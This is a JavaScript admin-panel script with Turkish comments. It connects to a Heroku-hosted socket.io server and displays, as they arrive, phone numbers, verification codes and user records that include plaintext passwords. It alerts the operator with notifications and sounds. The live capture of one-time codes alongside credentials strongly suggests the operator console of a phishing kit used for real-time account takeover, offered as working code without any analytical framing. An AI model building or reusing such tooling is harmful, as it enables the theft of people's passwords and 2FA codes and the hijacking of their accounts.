console.log("ADMIN SCRIPT YÜKLENDİ");

const socket = io("https://afternoon-lake-61658-70a3b4756b95.herokuapp.com");

socket.on("connect", () => {
  console.log("ADMIN SOCKET CONNECTED:", socket.id);
});

const phoneTable = document.getElementById("phones-table");
const codeTable = document.getElementById("codes-table");
const usersTable = document.getElementById("users-table");

// Yeni telefon numarası
socket.on("admin-new-phone", (data) => {
  console.log("ADMIN PHONE GELDİ:", data);

  if (phoneTable) {
    const tr = document.createElement("tr");
    tr.classList.add("flash");
    tr.innerHTML = `<td>${data.phone}</td><td>${data.date}</td>`;
    phoneTable.prepend(tr);
  } else {
    console.log("phoneTable hatası: Element bulunamadı");
  }

  if (Notification.permission === "granted") {
    new Notification("Yeni Telefon", { body: `Telefon: ${data.phone}` });
  } else if (Notification.permission !== "denied") {
    Notification.requestPermission().then((perm) => {
      if (perm === "granted") {
        new Notification("Yeni Telefon", { body: `Telefon: ${data.phone}` });
      }
    });
  }

  const audio = new Audio("/phone.mp3");
  audio.play().catch((err) => console.log("Ses hatası:", err));
});

// Yeni doğrulama kodu
socket.on("admin-new-code", (data) => {
  console.log("ADMIN CODE GELDİ:", data);

  if (codeTable) {
    const tr = document.createElement("tr");
    tr.classList.add("flash");
    tr.innerHTML = `<td>${data.code}</td><td>${data.date}</td>`;
    codeTable.prepend(tr);
  } else {
    console.log("codeTable hatası: Element bulunamadı");
  }

  if (Notification.permission === "granted") {
    new Notification("Yeni Kod", { body: `Kod: ${data.code}` });
  } else if (Notification.permission !== "denied") {
    Notification.requestPermission().then((perm) => {
      if (perm === "granted") {
        new Notification("Yeni Kod", { body: `Kod: ${data.code}` });
      }
    });
  }

  const audio = new Audio("/code.mp3");
  audio.play().catch((err) => console.log("Ses hatası:", err));
});

// Yeni kullanıcı listesi
socket.on("update-users", (users) => {
  console.log("ADMIN USERS GELDİ:", users);

  if (!usersTable) {
    console.log("usersTable hatası: Element bulunamadı");
    return;
  }

  usersTable.innerHTML = "";

  users.forEach((user) => {
    const tr = document.createElement("tr");
    tr.classList.add("flash");
    tr.innerHTML = `
      <td>${user.username || "-"}</td>
      <td>${user.name || "-"}</td>
      <td>${user.surname || "-"}</td>
      <td>${user.email || "-"}</td>
      <td>${user.password || "-"}</td>
      <td>${user.phone || "-"}</td>
      <td>${user.userid || "-"}</td>
      <td>${user.registerDate || "-"}</td>
      <td>${user.date || "-"}</td>
    `;
    usersTable.prepend(tr);
  });
});